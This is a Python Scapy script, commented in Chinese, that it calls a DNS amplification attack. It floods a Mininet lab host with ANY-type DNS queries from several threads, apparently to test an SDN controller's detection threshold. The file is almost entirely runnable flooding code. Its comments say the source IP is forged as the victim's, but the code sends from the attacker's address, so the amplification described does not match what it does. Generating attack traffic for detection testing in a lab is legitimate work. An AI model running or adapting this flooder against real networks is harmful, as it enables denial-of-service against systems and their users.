#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DNS放大攻击脚本 (DNS Amplification Attack)

功能：模拟DNS放大攻击，伪造源IP发送大量DNS查询

攻击者：H3 (192.168.1.102)
目标：H7 (192.168.1.108)

检测原理：
- 1秒内DNS查询(UDP 53)数量 > 100
"""

from scapy.all import *
import threading
import time
import argparse
import random

def dns_amplification(victim_ip='192.168.1.108', attacker_ip='192.168.1.102', threads=5, duration=60, rate=150):
    """
    DNS放大攻击
    
    Args:
        victim_ip: 受害者IP（目标）
        attacker_ip: 攻击者IP（源）
        threads: 线程数
        duration: 攻击持续时间（秒）
        rate: 每秒DNS查询数
    """
    
    stop_flag = threading.Event()
    stats = {'total_queries': 0, 'lock': threading.Lock()}
    
    # 常见的大型DNS查询（放大效果）
    dns_queries = [
        'www.google.com', 'www.facebook.com', 'www.youtube.com',
        'www.amazon.com', 'www.twitter.com', 'www.instagram.com',
        'www.baidu.com', 'www.qq.com', 'www.taobao.com',
        'dns.google.com', 'cloudflare.com', 'github.com'
    ]
    
    def dns_attack_thread():
        """单个DNS攻击线程"""
        while not stop_flag.is_set():
            try:
                # 构造DNS查询包
                domain = random.choice(dns_queries)
                
                # 伪造源IP为受害者（放大攻击原理）
                ip = IP(src=attacker_ip, dst=victim_ip)
                udp = UDP(sport=random.randint(1024, 65535), dport=53)
                
                # DNS查询（ANY类型返回最大）
                dns = DNS(rd=1, qd=DNSQR(qname=domain, qtype='ANY'))
                
                pkt = ip / udp / dns
                
                # 发送数据包
                send(pkt, verbose=0)
                
                # 更新统计
                with stats['lock']:
                    stats['total_queries'] += 1
                
                # 控制速率
                time.sleep(1.0 / (rate / threads))
                
            except Exception as e:
                print(f"[错误] {e}")
    
    def monitor_thread():
        """监控线程，打印统计信息"""
        start_time = time.time()
        last_count = 0
        
        while not stop_flag.is_set():
            time.sleep(10)  # 每10秒打印一次
            
            elapsed = time.time() - start_time
            current_count = stats['total_queries']
            
            # 计算速率
            current_rate = (current_count - last_count) / 10
            avg_rate = current_count / elapsed if elapsed > 0 else 0
            
            print(f"[{int(elapsed)}s] 总DNS查询: {current_count} | 当前速率: {current_rate:.1f} qps | 平均速率: {avg_rate:.1f} qps")
            
            last_count = current_count
    
    print(f"{'='*60}")
    print(f"📡 DNS放大攻击启动")
    print(f"{'='*60}")
    print(f"攻击者IP: {attacker_ip} (H3)")
    print(f"目标IP:   {victim_ip} (H7)")
    print(f"目标端口: 53 (DNS)")
    print(f"线程数:   {threads}")
    print(f"目标速率: {rate} qps")
    print(f"持续时间: {duration} 秒")
    print(f"{'='*60}\n")
    
    # 启动攻击线程
    threads_list = []
    for i in range(threads):
        t = threading.Thread(target=dns_attack_thread)
        t.daemon = True
        threads_list.append(t)
        t.start()
        print(f"[线程{i+1}] 已启动，目标速率: {rate//threads} qps")
    
    # 启动监控线程
    monitor = threading.Thread(target=monitor_thread)
    monitor.daemon = True
    monitor.start()
    
    # 等待指定时间
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        print("\n[中断] 用户停止攻击")
    
    # 停止所有线程
    stop_flag.set()
    for t in threads_list:
        t.join(timeout=1)
    
    print(f"\n{'='*60}")
    print(f"✅ DNS放大攻击结束")
    print(f"{'='*60}")
    print(f"总DNS查询: {stats['total_queries']}")
    print(f"平均速率:   {stats['total_queries']/duration:.1f} qps")
    print(f"{'='*60}")
    print(f"\n💡 预期RYU控制器检测结果:")
    print(f"   - 异常类型: DNS放大攻击")
    print(f"   - 限速措施: 256 kbps")
    print(f"   - 检测条件: 1秒内DNS查询>100")
    print(f"   - ✅ 会写入attack_sessions表")
    print(f"   - ✅ 大约1-2秒内触发！")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='DNS放大攻击脚本')
    parser.add_argument('--victim', '-v', default='192.168.1.108', help='目标IP地址（默认H7）')
    parser.add_argument('--attacker', '-a', default='192.168.1.102', help='攻击者IP（默认H3）')
    parser.add_argument('--threads', '-n', type=int, default=5, help='线程数')
    parser.add_argument('--duration', '-d', type=int, default=60, help='攻击持续时间（秒）')
    parser.add_argument('--rate', '-r', type=int, default=150, help='目标速率（qps）')
    
    args = parser.parse_args()
    
    try:
        dns_amplification(
            victim_ip=args.victim,
            attacker_ip=args.attacker,
            threads=args.threads,
            duration=args.duration,
            rate=args.rate
        )
    except KeyboardInterrupt:
        print("\n\n[中断] 用户停止攻击")
    except Exception as e:
        print(f"\n[错误] {e}")

"""
使用示例：

1. 默认攻击（H3 攻击 H7，150 qps，60秒）：
   sudo python3 dns_amplification.py

2. 高速攻击（300 qps）：
   sudo python3 dns_amplification.py -r 300 -n 8

在Mininet中使用：
   mininet> h3 python3 dns_amplification.py &

注意：
- ✅ 默认配置：H3(192.168.1.102) 攻击 H7(192.168.1.108)
- ✅ RYU检测阈值：1秒内>100个DNS查询
- ✅ 默认150qps，几秒钟就会触发检测
- ✅ 会自动写入attack_sessions表
"""